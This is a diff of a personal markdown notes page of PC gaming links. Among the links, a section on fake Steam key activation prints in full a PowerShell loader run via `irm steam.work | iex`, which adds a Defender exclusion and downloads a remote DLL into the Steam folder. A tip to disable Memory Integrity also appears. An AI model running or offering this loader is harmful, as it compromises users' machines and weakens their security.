@@ -2,7 +2,7 @@
 title: PC Games
 description: ""
 created: 2018-01-03
-updated: 2023-11-26
+updated: 2024-09-30
 tags:
   - games
 ---
@@ -18,16 +18,16 @@ tags:
 
 [/r/pcgaming/](https://www.reddit.com/r/pcgaming/)
 
-[Worth A Buy - YouTube](https://www.youtube.com/user/Worthabuyguys)
-[The Co-op Mode - YouTube](https://www.youtube.com/channel/UCpdSQ4MAvvEdRC-T7v4ebLQ)
-[Stumpt - YouTube](https://www.youtube.com/channel/UCVH4oOW0CBJ1W_WsJKd_62Q)
+[Worth A Buy - YouTube](https://www.youtube.com/@WorthABuyreviews)
+[Stumpt - YouTube](https://www.youtube.com/@stumpt) playing coop games
+[Lextorias - YouTube](https://www.youtube.com/@Lextorias) game history
 
-[Viva La Dirt League - YouTube](https://www.youtube.com/c/VivaLaDirtLeague) game and movie logic parodies
-[LowSpecGamer - YouTube](https://www.youtube.com/channel/UCQkd05iAYed2-LOmhjzDG6g)
-[ΣSigma 二次元解密 - YouTube](https://www.youtube.com/channel/UCF4r7ZrULUjwkA1mfo-MC9g)
-[K Gaming - YouTube](https://www.youtube.com/channel/UCY7KP-WnTgwvhlAyU1-TFdA)
-[LazerzZ - YouTube](https://www.youtube.com/channel/UClYyLx8HPP2lfc24QUGLKlw) good summary of gameplay and plot
-[Digital Foundry - YouTube](https://www.youtube.com/user/DigitalFoundry) frame time analysis
+[Viva La Dirt League - YouTube](https://www.youtube.com/@VivaLaDirtLeague) game and movie logic parodies
+[LowSpecGamer - YouTube](https://www.youtube.com/@LowSpecGamer)
+[ΣSigma二次元解密 - YouTube](https://www.youtube.com/@sigma_hk)
+[达奇上校 - YouTube](https://www.youtube.com/@DaQiShangXiao/) game plot and lore
+[LazerzZ - YouTube](https://www.youtube.com/@LazerzZ) good summary of gameplay and plot
+[Digital Foundry - YouTube](https://www.youtube.com/@DigitalFoundry) frame time analysis
 
 [The Spiffing Brit Breaks Games - YouTube](https://www.youtube.com/playlist?list=PLcXPLd_I-oBqnNYc9x-L1Dbi5Zl0Jkzy7) exploiting game glitches and design flaws for fun
 
@@ -42,7 +42,9 @@ tags:
 [IGDB.com](https://www.igdb.com/discover)
 [Video Game Reviews, Articles, Trailers and more - Metacritic](https://www.metacritic.com/game)
 
+[The Co-op Mode - YouTube](https://www.youtube.com/channel/UCpdSQ4MAvvEdRC-T7v4ebLQ)
 [Co-Optimus - Your Prime Source for Co-Op Gaming - Home Page](https://www.co-optimus.com/)
+[Best Local Co-Op & Split-Screen Games On Steam](https://gamerant.com/best-pc-steam-split-screen-local-couch-co-op-games/)
 
 [Games of the Decade • Archive • Eurogamer.net](https://www.eurogamer.net/archive/games-of-the-decade)
 [Best PC games of all time | Rock Paper Shotgun](https://www.rockpapershotgun.com/2017/11/24/best-pc-games/1/)
@@ -131,6 +133,8 @@ New Big Picture mode from Steam desktop app in 2023-02
 [把 iPad 当电竞屏，玩 120fps 的 PC 游戏？！ - YouTube](https://www.youtube.com/watch?v=_sHFL_ekYko)
 [【亦】简单几步，把手机变成最强 HDR 游戏显示器 - YouTube](https://www.youtube.com/watch?v=JUJesHrScmM)
 
+[How to Automatically Capture Game Highlights With Any GPU](https://www.makeuseof.com/automatically-capture-game-highlights-any-gpu-outplayed/)
+
 ### Steam Link/Steam in-home streaming
 
 [Steam Link General Discussions :: Steam Community](https://steamcommunity.com/app/353380/discussions/)
@@ -156,7 +160,7 @@ New Big Picture mode from Steam desktop app in 2023-02
 ### Parsec
 
 [Game Streaming - Play Games With Friends | Parsec](https://parsecgaming.com/)
-[Parsec (software) - Wikiwand](<https://www.wikiwand.com/en/Parsec_(software)>)
+[Parsec (software) - Wikiwand](<https://omni.wikiwand.com/en/Parsec_(software)>)
 [Blog | Game Streaming - Cloud Gaming | Parsec](https://blog.parsecgaming.com/)
 
 [Parsec support](https://support.parsec.app/hc/en-us)
@@ -173,12 +177,15 @@ New Big Picture mode from Steam desktop app in 2023-02
 
 ### GameStream (Moonlight)
 
+[我完全低估了游戏串流，2024年可以剪断视频线了？ - YouTube](https://www.youtube.com/watch?v=iug2V2hBmYc)
+
 [Sunshine documentation](https://docs.lizardbyte.dev/projects/sunshine/en/latest/)
 [LizardByte/Sunshine: Sunshine is a Gamestream host for Moonlight.](https://github.com/LizardByte/Sunshine)
 [Low-Latency Remote Desktop for Gaming and Work ... - YouTube](https://www.youtube.com/watch?v=YBH3MAvylVg)
 
 [Moonlight Game Streaming](http://moonlight-stream.com/) nVidia card
 [Setup Guide · moonlight-stream/moonlight-docs Wiki · GitHub](https://github.com/moonlight-stream/moonlight-docs/wiki/Setup-Guide)
+f
 
 ## GeDoSaTo
 
@@ -195,6 +202,13 @@ New Big Picture mode from Steam desktop app in 2023-02
 
 [What 'optimization' really means in games | PC Gamer](http://www.pcgamer.com/what-optimization-really-means-in-games/)
 [Article on “Optimization” for PC Gamer — Bonus Content | metaclassofnilblog](http://blog.metaclassofnil.com/?p=849)
+
+[I Tweaked These 7 Windows 11 Settings to Maximize Gaming Performance](https://www.makeuseof.com/windows-11-settings-to-maximize-gaming-performance/)
+
+- Remove Xbox Game Bar overlay
+  `Ge-AppxPackage Microsoft.XboxGamingOverlay | Remove-AppxPackage`
+- Disable "Memory Integrity" in Windows Security
+- Disable "Virtual Machine Platform" in Windows features
 
 [How to automatically optimize newly added games](https://windowsreport.com/automatically-optimize-newly-added-game/)
 [Update Drivers & Optimal Playable Settings | NVIDIA GeForce Experience](https://www.nvidia.com/en-us/geforce/geforce-experience/)
@@ -245,11 +259,156 @@ Grey markets:
 <http://www.cjs-cdkeys.com/>
 <https://hardforum.com/threads/which-of-these-cd-key-sites-are-legit.1647686/>
 
-[初夏 ChuXXia - YouTube](https://www.youtube.com/channel/UC1XHGjmfXm2Cr1OFDn6leSw)
+[初夏ChuXXia - YouTube](https://www.youtube.com/@ChuXXia/)
 
-<https://steamspy.com/>
-<https://steamdb.info/>
-<https://steamdb.info/calculator/>
+[SteamDB](https://steamdb.info/)
+[Steam Calculator and SteamID Finder · SteamDB](https://steamdb.info/calculator/)
+[SteamSpy - All the data and stats about Steam games](https://steamspy.com/)
+
+### Steam 假入庫
+
+[都是套路！Steam游戏虚假入库的黑灰产手法刨析，当心变肉鸡！ - 先知社区](https://xz.aliyun.com/t/14482?time__1311=GqAxuQi%3DGQoxlxGgx%2BxCuR4jo%3DDg7Brr7aoD)
+[Steam入库，irm steam.work|iex 风险和原理（代码分析） - 哔哩哔哩](https://www.bilibili.com/read/cv33369234/?jump_opus=1)
+
+[SteamTools - 游戏热爱者](https://steamtools.net/)
+[ikunshare/Onekey: Onekey Steam Depot Manifest Downloader](https://github.com/ikunshare/Onekey)
+[【steam】【假CDkey】Steam如何通过清单入库 - 搞七捻三 - LINUX DO](https://linux.do/t/topic/38982)
+[pjy612/SteamManifestCache: Steam Depot Manifest Files Cache[2.13.7]](https://github.com/pjy612/SteamManifestCache/tree/main)
+[SAI Free 可入库列表 · pjy612/SteamManifestCache · Discussion #798 · GitHub](https://github.com/pjy612/SteamManifestCache/discussions/798)
+[分析一个steam假入库行为，附带相关恶意样本 - 逗比大师 - 博客园](https://www.cnblogs.com/0day-li/p/18042274)
+
+Some vendor from Taobao (https://dianjiafen.world.tmall.com/shop/view_shop.htm) sell cheap global region Steam keys. They even give you bonus games in the list on https://www.kdocs.cn/l/cpFa9w9LqZOH.
+The keys won't work on the activation page on web or standard Steam client.
+They must be activated using Steam launched by `irm steam.work | iex` in Admin PowerShell.
+Steam will restart after entering the key, the script seems to replace several `.dll`'s in Steam folder by files from `http://1.steam.work/api/integral/pwsDownFile`.
+These games only show up in the patched Steam and not available on other machines with the same login.
+
+`steam.work.ps1`:
+
+```powershell
+Write-Host -NoNewline "          _____                _____                    _____                    _____                    _____          `r" -ForegroundColor:blue
+Write-Host -NoNewline "         /\    \              /\    \                  /\    \                  /\    \                  /\    \         `r" -ForegroundColor:blue
+Write-Host -NoNewline "        /::\    \            /::\    \                /::\    \                /::\    \                /::\____\        `r" -ForegroundColor:blue
+Write-Host -NoNewline "       /::::\    \           \:::\    \              /::::\    \              /::::\    \              /::::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "      /::::::\    \           \:::\    \            /::::::\    \            /::::::\    \            /:::::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "     /:::/\:::\    \           \:::\    \          /:::/\:::\    \          /:::/\:::\    \          /::::::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "    /:::/__\:::\    \           \:::\    \        /:::/__\:::\    \        /:::/__\:::\    \        /:::/|::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "    \:::\   \:::\    \          /::::\    \      /::::\   \:::\    \      /::::\   \:::\    \      /:::/ |::|   |        `r" -ForegroundColor:blue
+Write-Host -NoNewline "  ___\:::\   \:::\    \        /::::::\    \    /::::::\   \:::\    \    /::::::\   \:::\    \    /:::/  |::|___|______  `r" -ForegroundColor:blue
+Write-Host -NoNewline " /\   \:::\   \:::\    \      /:::/\:::\    \  /:::/\:::\   \:::\    \  /:::/\:::\   \:::\    \  /:::/   |::::::::\    \ `r" -ForegroundColor:blue
+Write-Host -NoNewline "/::\   \:::\   \:::\____\    /:::/  \:::\____\/:::/__\:::\   \:::\____\/:::/  \:::\   \:::\____\/:::/    |:::::::::\____\`r" -ForegroundColor:blue
+Write-Host -NoNewline "\:::\   \:::\   \::/    /   /:::/    \::/    /\:::\   \:::\   \::/    /\::/    \:::\  /:::/    /\::/    / ~~~~~/:::/    /`r" -ForegroundColor:blue
+Write-Host -NoNewline " \:::\   \:::\   \/____/   /:::/    / \/____/  \:::\   \:::\   \/____/  \/____/ \:::\/:::/    /  \/____/      /:::/    / `r" -ForegroundColor:blue
+Write-Host -NoNewline "  \:::\   \:::\    \      /:::/    /            \:::\   \:::\    \               \::::::/    /               /:::/    /  `r" -ForegroundColor:blue
+Write-Host -NoNewline "   \:::\   \:::\____\    /:::/    /              \:::\   \:::\____\               \::::/    /               /:::/    /   `r" -ForegroundColor:blue
+Write-Host -NoNewline "    \:::\  /:::/    /    \::/    /                \:::\   \::/    /               /:::/    /               /:::/    /    `r" -ForegroundColor:blue
+Write-Host -NoNewline "     \:::\/:::/    /      \/____/                  \:::\   \/____/               /:::/    /               /:::/    /     `r" -ForegroundColor:blue
+Write-Host -NoNewline "      \::::::/    /                                 \:::\    \                  /:::/    /               /:::/    /      `r" -ForegroundColor:blue
+Write-Host -NoNewline "       \::::/    /                                   \:::\____\                /:::/    /               /:::/    /       `r" -ForegroundColor:blue
+Write-Host -NoNewline "        \::/    /                                     \::/    /                \::/    /                \::/    /        `r" -ForegroundColor:blue
+Write-Host -NoNewline "         \/____/                                       \/____/                  \/____/                  \/____/         `r" -ForegroundColor:blue
+
+$filePathToDelete = Join-Path $env:USERPROFILE "x.ps1"
+ if (Test-Path $filePathToDelete) {
+    Remove-Item -Path $filePathToDelete
+}
+$desktopFilePathToDelete = Join-Path ([System.Environment]::GetFolderPath('Desktop')) "x.ps1"
+if (Test-Path $desktopFilePathToDelete) {
+    Remove-Item -Path $desktopFilePathToDelete
+}
+
+$steamRegPath = 'HKCU:\Software\Valve\Steam'
+$localPath = -join ($env:LOCALAPPDATA,"\Steam")
+if ((Test-Path $steamRegPath)) {
+    $properties = Get-ItemProperty -Path $steamRegPath
+    if ($properties.PSObject.Properties.Name -contains 'SteamPath') {
+        $steamPath = $properties.SteamPath
+    }
+}
+
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+ivt+mHjeaWsOaJk+W8gFBvd2VyIHNoZWxsIOaJk+W8gOaWueW8j+S7peeuoeeQhuWRmOi6q+S7vei/kOihjF0="))
+    Write-Host "$TextShow" -ForegroundColor:red
+    return;
+}
+
+function PwStart() {
+    if ($steamPath -eq ""){
+        Write-Host "[请检查您的Steam是否正确安装]" -ForegroundColor:Red
+        return;
+    }
+
+    Write-Host "[ServerStart        OK]" -ForegroundColor:green
+    Stop-Process -Name steam* -Force -ErrorAction Stop
+    Start-Sleep 2
+    if(Get-Process steam* -ErrorAction Stop){
+        TASKKILL /F /IM "steam.exe" | Out-Null
+        Start-Sleep 2
+    }
+
+    if (!(Test-Path $localPath)) {
+        md $localPath | Out-Null
+        if (!(Test-Path $localPath)) {
+            New-Item $localPath -ItemType directory -Force | Out-Null
+        }
+    }
+
+    try{
+        Add-MpPreference -ExclusionPath $steamPath -ErrorAction Stop
+        Start-Sleep 3
+    }catch{}
+
+    Write-Host "[Result->0          OK]" -ForegroundColor:green
+
+    try{
+        $d = $steamPath + "/version.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+        $d = $steamPath + "/user32.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+        $d = $steamPath + "/steam.cfg"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+        $d = $steamPath + "/hid.dll"
+        if (Test-Path $d) {
+            Remove-Item $d -Recurse -Force -ErrorAction Stop | Out-Null #清除文件
+        }
+        $d = $steamPath + "/hid"
+    }catch{
+        $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+W8guW4uOaui+eVmeivt+aMieeFp+i3r+W+hOWIoOmZpOaWh+S7tl0tPg=="))
+        Write-Host "$TextShow[$d]" -ForegroundColor:red
+        return;
+    }
+
+    $downApi = "http://1.steam.work/api/integral/pwsDownFile"
+
+    irm -Uri $downApi -Headers @{ Referer = "libary" } -OutFile $d -ErrorAction Stop
+    $newFilePath = [System.IO.Path]::ChangeExtension($d, ".dll")
+    Rename-Item -Path $d -NewName $newFilePath
+
+    Write-Host "[Result->1          OK]" -ForegroundColor:green
+    $d = $localPath + "/localData.vdf"
+    irm -Uri $downApi -Headers @{ Referer = "localData.vdf" } -OutFile $d -ErrorAction Stop
+    Write-Host "[Result->2          OK]" -ForegroundColor:green
+
+    Start-Sleep 1
+
+    Start steam://
+    $TextShow = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("W+aOpeacjeWZqOaIkOWKn+WcqFN0ZWFt5YWl5r+A5rS7IDPnp5LlkI7oh6pd"))
+    Write-Host "$TextShow" -ForegroundColor:green
+    Start-Sleep 3
+
+    $processID = Get-CimInstance Win32_Process -Filter "ProcessId = '$pid'"
+    Stop-Process -Id $processID.ParentProcessId -Force
+    exit
+}
+
+PwStart
+```
 
 ### XGP
 
@@ -274,9 +433,18 @@ Grey markets:
 
 ### Game list/API
 
+[[Online Game Stores] How to aggregate a list of all the owned games ? | Official Pyra and Pandora Site](https://pyra-handheld.com/boards/threads/online-game-stores-how-to-aggregate-a-list-of-all-the-owned-games.99681/)
+
 Use [IsThereAnyDeal](https://isthereanydeal.com/) to manage games across vendors
-[IsThereAnyDeal.com API · Apiary](https://itad.docs.apiary.io/#)
-[My Apps - IsThereAnyDeal](https://new.isthereanydeal.com/apps/mine/)
+[IsThereAnyDeal API](https://docs.isthereanydeal.com/)
+[My Apps - IsThereAnyDeal](https://isthereanydeal.com/apps/my/)
+
+[Steam Web API - Valve Developer Community](https://developer.valvesoftware.com/wiki/Steam_Web_API)
+[Purchase Account](https://store.steampowered.com/account/history/)
+
+[SD4RK/epicstore_api: Epic Games Store Web API Wrapper written in Python](https://github.com/SD4RK/epicstore_api)
+[Authentication | Epic Online Services Developer](https://dev.epicgames.com/docs/epic-account-services/auth)
+[Transactions History](https://www.epicgames.com/account/transactions?historyType=PAYMENT_HISTORY) Login and check payment history
 
 [onowrouzi/game-deal-finder: React Native app utilizing the IsThereAnyDeal API.](https://github.com/onowrouzi/game-deal-finder)
 [onowrouzi/itad-api-client-ts: A typescript api library/client for IsThereAnyDeal.](https://github.com/onowrouzi/itad-api-client-ts)
@@ -312,6 +480,7 @@ Login Steam first:
 [Steam/Game-specific troubleshooting - ArchWiki](https://wiki.archlinux.org/title/Steam/Game-specific_troubleshooting)
 
 [THE GAMING ON LINUX GUIDE: How to play anything: Steam, Epic, Ubisoft, Origin, Battle.net, GoG... - YouTube](https://www.youtube.com/watch?v=v9tb1gTTbJE)
+[Microsoft Should be VERY Afraid - Noob's Guide to Linux Gaming - YouTube](https://www.youtube.com/watch?v=Co6FePZoNgE)
 
 [tkashkin/GameHub: All your games in one place](https://github.com/tkashkin/GameHub)
 [kra-mo/cartridges: A GTK4 + Libadwaita game launcher](https://github.com/kra-mo/cartridges)
@@ -320,9 +489,18 @@ Login Steam first:
 
 [How to write a Windows emulator for Linux from scratch - YouTube](https://www.youtube.com/watch?v=8-N7wDCRohg)
 
+### Installing Steam
+
+```sh
+yay -S --noconfirm flatpak steam-devices
+flatpak install com.valvesoftware.Steam
+```
+
 ### Proton
 
 [Steam Play | GamingOnLinux](https://www.gamingonlinux.com/steamplay/) Steam Play is the feature, with Proton as one of the runtime
+
+[【掌機測評】SteamDeck 搭載 Linux，憑什麼可以玩 Win 遊戲？ - YouTube](https://www.youtube.com/watch?v=uz0HGDVXLqI)
 [A simple guide to Steam Play, Valve's technology for playing Windows games on Linux | GamingOnLinux](https://www.gamingonlinux.com/2019/07/a-simple-guide-to-steam-play-valves-technology-for-playing-windows-games-on-linux/)
 [A simple guide to Steam Play, Valve's technology for playing Windows games on Linux | GamingOnLinux](https://www.gamingonlinux.com/articles/14552/)
 [Steam for Linux :: Introducing a new version of Steam Play](https://steamcommunity.com/games/221410/announcements/detail/1696055855739350561)
@@ -445,6 +623,13 @@ Especially some older LEGO games
 
 [How to play Borderlands 2 Split-Screen on PC (Instructions) - Steam Users' Forums](https://web.archive.org/web/20150929034748/http://forums.steampowered.com:80/forums/showthread.php?t=2943265)
 
+## FPS Aiming
+
+[Aimlabs on Steam](https://store.steampowered.com/app/714010/Aimlabs/)
+
+[【idoce】別再追求肌肉記憶了😡全網最詳細槍法教學🔫這樣瞄準才是正確的✅全排位適用 特戰英豪槍法｜特戰英豪槍法教學EP.1 - YouTube](https://www.youtube.com/watch?v=wXOI3M6i64g)
+[【idoce】這樣握滑鼠才對✅如何正確控制手部肌肉❓爆頭率提升🔥全網最詳細槍法教學🔫全排位適用 特戰英豪槍法｜特戰英豪 槍法教學EP.2 - YouTube](https://www.youtube.com/watch?v=e_XNcrsN3_s)
+
 ## Micro-transaction
 
 Mobile games, with its large user base and micro-transaction business model, is encroaching traditional single player PC games market (mostly on development resources)
@@ -514,11 +699,97 @@ Skill Up
 
 # Halo
 
+[Halopedia, the Halo wiki](https://www.halopedia.org/)
+[Halo Alpha | Fandom](https://halo.fandom.com/wiki/Halo_Alpha)
+
+[HiddenXperia - YouTube](https://www.youtube.com/@HiddenXperia)
+[SameToken - YouTube](https://www.youtube.com/@SameToken)
+[Installation00 - YouTube](https://www.youtube.com/@Installation00)
+[Late Night Gaming - YouTube](https://www.youtube.com/@LateNightHalo)
+
+[Halo: The Master Chief Collection Guide - IGN](https://www.ign.com/wikis/halo-master-chief-collection)
+
+## Lore
+
 [Halo Recapped: The Complete Timeline So Far (Halo Lore) - YouTube](https://www.youtube.com/watch?v=y6DtLNPet0k)
 [The Complete Story, Timeline and Lore of Halo, through Infinite - YouTube](https://www.youtube.com/watch?v=VV8MWjpuVDE)
+[The Endless, Forerunners and Precursors - Lore and Theory - YouTube](https://www.youtube.com/watch?v=chBd2QF7r7g)
 
+The Flood (different forms)
+The Forerunners
+The Precursors
+The Endless
+The Guardians
+The Harbingers
+The Offensive Bias
+The Convenant
+The USNC
+The Banished
+
+[The comprehensive Flood playlist - their full history and lore! - YouTube](https://www.youtube.com/playlist?list=PLMFta-CCYzCc2r_UUf-8Vz4ZsUl9QQkhF) HiddenXperia
+
+[The Flood COMPLETE History (+100,000 Years of Terror) - YouTube](https://www.youtube.com/watch?v=Gsqra0vPk4k)
+
+HiddenXperia
+[Halo 3's Strange Ending FINALLY EXPLAINED - YouTube](https://www.youtube.com/watch?v=m6yCefKUvTc)
+[Halo Infinite Legendary Ending EXPLAINED! (Harbinger Origins, Precursors, DLC1 Theories & More) - YouTube](https://www.youtube.com/watch?v=cSh-0TUvz-E)
+
+[《最後一戰》一次看完HALO全系列故事 | HALO : 無限 玩前終極回顧 - YouTube](https://www.youtube.com/watch?v=LlbGj2HH0ks)
+[最後一戰HALO 如何改變射擊遊戲史? | 遊戲深入介紹 | 最後一戰：無限 | 超粒方 - YouTube](https://www.youtube.com/watch?v=NdQbCKG13A4)
 [一口氣看完 HALO 首三部曲的故事， 帶你進入這個世界! | 最後一戰 | 超粒方 - YouTube](https://www.youtube.com/watch?v=plRkU6RmNPI)
 [一口氣看完 HALO 4-6 的故事， 走完士官長的新旅程! | 最後一戰:無限 | 超粒方 - YouTube](https://www.youtube.com/watch?v=cUT-q0PzaO4)
+
+[光環HALO - YouTube](https://www.youtube.com/playlist?list=PLe1YdiKWcqPT7ffmR__T3GaKy3yyX8eLi) 达奇上校 ❗!important
+
+## Tech
+
+[Halo Explained | SameToken - YouTube](https://www.youtube.com/playlist?list=PLo6zPOJorCsq1EDTtb3wiEx-k9CFdjjyY)
+
+Installation00
+[Most Detailed - YouTube](https://www.youtube.com/playlist?list=PLLasqfX0uirNW-pBzpuK_No377zpaO6hJ)
+[The Armory - YouTube](https://www.youtube.com/playlist?list=PLLasqfX0uirOKDQj_5VBIWGoEqiv6zXNv)
+
+[Where the hell are the ODSTs!? | Lore and Theory - YouTube](https://www.youtube.com/watch?v=eTrbEe7Lb_o)
+
+## Halo Infinite
+
+[Why Is Halo Infinite's Campaign SO AWESOME And... MEDIOCRE?! - YouTube](https://www.youtube.com/watch?v=noKLXT9m8z0)
+[Saying Goodbye To Halo Infinite's Campaign 🥲 - YouTube](https://www.youtube.com/watch?v=XMZqNYDP95E)
+
+[Halo Infinite Legendary Ending EXPLAINED! (Harbinger Origins, Precursors, DLC1 Theories & More) - YouTube](https://www.youtube.com/watch?v=cSh-0TUvz-E)
+
+[HALO INFINITE Campaign Gameplay Walkthrough FULL GAME No Commentary - YouTube](https://www.youtube.com/watch?v=Ha_-3ChWCqk)
+[Halo Infinite Campaign movie, No Gameplay - YouTube](https://www.youtube.com/watch?v=mUhB7Sw2wgg)
+
+# Fortnite
+
+[Fortnite | Download & Play For Free - Epic Games Store](https://store.epicgames.com/en-US/p/fortnite)
+
+[Fortnite Wiki | Fandom](https://fortnite.fandom.com/wiki/Fortnite_Wiki)
+
+## Fortnite Save the World
+
+[Why Fortnite: Save The World Was Abandoned - YouTube](https://www.youtube.com/watch?v=OCgVhrjBvPc) abandoned in 2020
+[Save The World | Fortnite's Forgotten Gamemode - YouTube](https://www.youtube.com/watch?v=m3Jo8gHJ1dU)
+
+[Save the World | Fortnite Wiki | Fandom](https://fortnite.fandom.com/wiki/Fortnite:_Save_the_World)
+[Heroes | Fortnite Wiki | Fandom](https://fortnite.fandom.com/wiki/Heroes)
+[10 Save The World Pro Tips You Didn't Know About 🤗 - YouTube](https://www.youtube.com/watch?v=JdZwNE-VLK8)
+[Fortnite SAVE THE WORLD In 2024.. - YouTube](https://www.youtube.com/watch?v=2StL8UQf5BE)
+
+Beast
+[Fortnite Save the World Guides - YouTube](https://www.youtube.com/playlist?list=PLYgB03ey6x4-IMN4uT5PxuHiN0MU2IRxI)
+[STW Trap Guides - YouTube](https://www.youtube.com/playlist?list=PLYgB03ey6x4_xRMQEIOVx52pDGLaauzmP)
+[The ULTIMATE Guide to Fortnite Save the World! - YouTube](https://www.youtube.com/watch?v=ap8c0oD0QJA) ❗!important
+[C5 S3: BEST Ways to get Battle Pass XP From Fortnite Save the World! - YouTube](https://www.youtube.com/watch?v=wSOnfcvJ4go)
+
+# Tom Clancy's Ghost Recon
+
+[History of Ghost Recon (2001 - 2019) - YouTube](https://www.youtube.com/watch?v=1hgmuSMQ4q0)
+
+## Tom Clancy's Ghost Recon Wildlands
+
+[107 Ghost Recon Wildlands FACTS You Should KNOW! | The Leaderboard - YouTube](https://www.youtube.com/watch?v=XVal1lOOIcs)
 
 # Lichdom: Battlemage
 
@@ -531,7 +802,7 @@ Skill Up
 
 # Crysis
 
-[Crysis - Wikiwand](https://www.wikiwand.com/en/Crysis)
+[Crysis - Wikiwand](https://omni.wikiwand.com/en/Crysis)
 [The Rise and Fall of Crysis - YouTube](https://www.youtube.com/watch?v=_jUhTD48MjY)
 
 [Crysis - PCGamingWiki PCGW - bugs, fixes, crashes, mods, guides and improvements for every PC game](https://www.pcgamingwiki.com/wiki/Crysis)
@@ -592,7 +863,7 @@ Keepsakes from gifting Nectar
 # Oddworld
 
 [Oddworld Inhabitants - Home of the Oddworld games - Oddworld Inhabitants, Inc](https://www.oddworld.com/)
-[Oddworld - Wikiwand](https://www.wikiwand.com/en/Oddworld)
+[Oddworld - Wikiwand](https://omni.wikiwand.com/en/Oddworld)
 
 Oddworld: Abe's Oddysee: 2D platformer
 Oddworld: Abe's Exoddus: 2D platformer, with tight schedule
@@ -620,6 +891,11 @@ Oddworld: Soulstorm: Remake of Abe's Exoddus, the true part two
 [Steam Community :: Monster Train](https://steamcommunity.com/app/1102190)
 [Steam Community :: Guide :: 抛砖引玉——已知的各种族强力套路](https://steamcommunity.com/sharedfiles/filedetails/?id=2114148965)
 [Monster Train - YouTube](https://www.youtube.com/results?search_query=Monster+Train)
+
+# Diving Dave
+
+[【潛水員戴夫】全網最詳細的新手指南 | 4K #潛水員戴夫 #davethediver - YouTube](https://www.youtube.com/watch?v=NwWz1XRIdI0)
+[潛水員戴夫哥斯拉DLC詳細攻略 - YouTube](https://www.youtube.com/watch?v=HlwZuW6dlnM)
 
 # Riftbreaker
 
@@ -659,16 +935,36 @@ r_soft_shadows none
 [《迴圈英雄》小品爆紅黑馬 LoopHero➤ 你們久等的攻略來了！各種小技巧 ◆ 素材掉落規則 ◆ 隱藏王呼叫方法 ◆ 建築優先順序 - YouTube](https://www.youtube.com/watch?v=n5qSuhx_N1U)
 [老军医擎天兔 - YouTube](https://www.youtube.com/channel/UCnAJ6OSUJqoVv0MB3R9kAFg/search?query=loop%20hero)
 
+# Devil May Cry
+
+[一口气看完【鬼泣】全系列1~5加动画片 - YouTube](https://www.youtube.com/watch?v=yr4tew24HxY)
+
+[『鬼泣1』（惡魔獵人1）天花板act游戏的起源，居然是生化危机（惡靈古堡）的废案！它是如何诞生的【修片狂魔】 - YouTube](https://www.youtube.com/watch?v=hlg8ZAxZpNo)
+[『鬼泣4』无数动作游戏玩家的入坑作，剧情细节讲解，看完欲罢不能！—#游戏解说 #游戏 #打鬼 - YouTube](https://www.youtube.com/watch?v=-MEfOGXwkBo)
+[『鬼泣5』（惡魔獵人5）系列梗最多的作品！大病区稳定发挥！究竟讲了什么故事！【修片狂魔】 - YouTube](https://www.youtube.com/watch?v=3If-LOVgdVg)
+[『鬼泣DMC』鬼泣系列最具争议的一部作品，主角但丁更改往日骚气，与鬼泣正传完全不同的世界观！【修片狂魔】 - YouTube](https://www.youtube.com/watch?v=W_-CHm5SkrA)
+
 # Prince of Persia
 
-[Prince of Persia - Wikiwand](https://www.wikiwand.com/en/Prince_of_Persia)
+[Prince of Persia - Wikiwand](https://omni.wikiwand.com/en/Prince_of_Persia)
 [The Rise and Fall of Prince of Persia - YouTube](https://www.youtube.com/watch?v=gjQYIhFMQs8)
 
-[Prince of Persia: The Sands of Time - Wikiwand](https://www.wikiwand.com/en/Prince_of_Persia:_The_Sands_of_Time)
-[Prince of Persia: Warrior Within - Wikiwand](https://www.wikiwand.com/en/Prince_of_Persia:_Warrior_Within)
-[Prince of Persia: The Two Thrones - Wikiwand](https://www.wikiwand.com/en/Prince_of_Persia:_The_Two_Thrones)
-[Prince of Persia: The Forgotten Sands - Wikiwand](https://www.wikiwand.com/en/Prince_of_Persia:_The_Forgotten_Sands)
-[Prince of Persia (2008 video game) - Wikiwand](<https://www.wikiwand.com/en/Prince_of_Persia_(2008_video_game)>)
+[Prince of Persia: he Sands of Time - Wikiwand](https://omni.wikiwand.com/en/Prince_of_Persia:_The_Sands_of_Time)
+[Prince of Persia: Warrior Within - Wikiwand](https://omni.wikiwand.com/en/Prince_of_Persia:_Warrior_Within)
+[Prince of Persia: The Two Thrones - Wikiwand](https://omni.wikiwand.com/en/Prince_of_Persia:_The_Two_Thrones)
+[Prince of Persia: The Forgotten Sands - Wikiwand](https://omni.wikiwand.com/en/Prince_of_Persia:_The_Forgotten_Sands)
+[Prince of Persia (2008 video game) - Wikiwand](<https://omni.wikiwand.com/en/Prince_of_Persia_(2008_video_game)>)
+
+# Star Wars Jedi
+
+[星球大戰《隕落的武士團》一次性理解其故事和解析 Star Wars Jedi:Fallen Order #星球大戰 #fallenorder #calkestis - YouTube](https://www.youtube.com/watch?v=gthqU9LcPAU)
+[星球大戰《幸存者》一次性理解其故事和解析 Star Wars Jedi:Survivor #星球大戰 #survivor #calkestis #dagangera - YouTube](https://www.youtube.com/watch?v=fQxAUTVbWuw)
+
+[星球大戰絕地：幸存者！全劇情解析！一口氣看完系列 - YouTube](https://www.youtube.com/watch?v=t-61WBDXTIE)
+
+# Hellblade
+
+[《地狱之刃》被隐藏的真实剧情！【GAMKER游戏鉴赏】 - YouTube](https://www.youtube.com/watch?v=KQUwYYS4QyE)
 
 # Quantum Break
 
@@ -703,6 +999,11 @@ r_soft_shadows none
 [The FULL Locust War TIMELINE in Gears of War Lore - YouTube](https://www.youtube.com/watch?v=e_1YEQ5-s1I)
